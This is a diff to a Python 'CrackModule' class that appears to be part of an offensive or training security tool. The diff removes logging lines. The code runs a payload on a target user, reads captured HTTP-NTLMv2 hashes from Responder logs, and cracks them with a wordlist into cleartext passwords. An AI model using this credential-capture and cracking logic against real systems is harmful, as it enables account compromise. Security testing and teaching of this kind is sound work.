@@ -18,8 +18,6 @@ class CrackModule:
             raise Exception("User not found.")
         await user.execute("./modules/payloads/payload_fetch_responder.py")
         log_dir = '/responder_logs'
-        logging.info(f"Checking for log files in {log_dir}")
-        logging.info(f"Files: {os.listdir(log_dir)}")
         log_files = [f for f in os.listdir(log_dir) if f.startswith('HTTP-NTLMv2-') and f.endswith('.txt')]
 
         if not log_files:
@@ -28,8 +26,7 @@ class CrackModule:
         log_file_path = os.path.join(log_dir, log_files[0])
 
         async with aiofiles.open(log_file_path, mode='r') as f:
-            ntlm = await f.readline() 
-        logging.info(f"NTLM: {ntlm}")
+            ntlm = await f.readline()
         ntlm = ntlm.strip()
         current_module_data = user.get_module_data(self.module_name) or {}
         new_module_data = current_module_data
@@ -54,8 +51,6 @@ class CrackModule:
     
 
     async def crack(self, uuid: str, wordlist_content: bytes):
-        logging.info("Starting password crack process for user with UUID: %s", uuid)
-
         user = self.user_repository.get_user(uuid)
 
         if not user:
@@ -98,7 +93,6 @@ class CrackModule:
                 cracked_password = (await f.read()).split(":")[-1]
 
             module_data["cleartext_password"] = cracked_password
-            logging.info(f"Password cracked for UUID: {uuid}: {cracked_password}")
             user.set_module_data(self.module_name, module_data)
             self.user_repository.save_user(user)
 
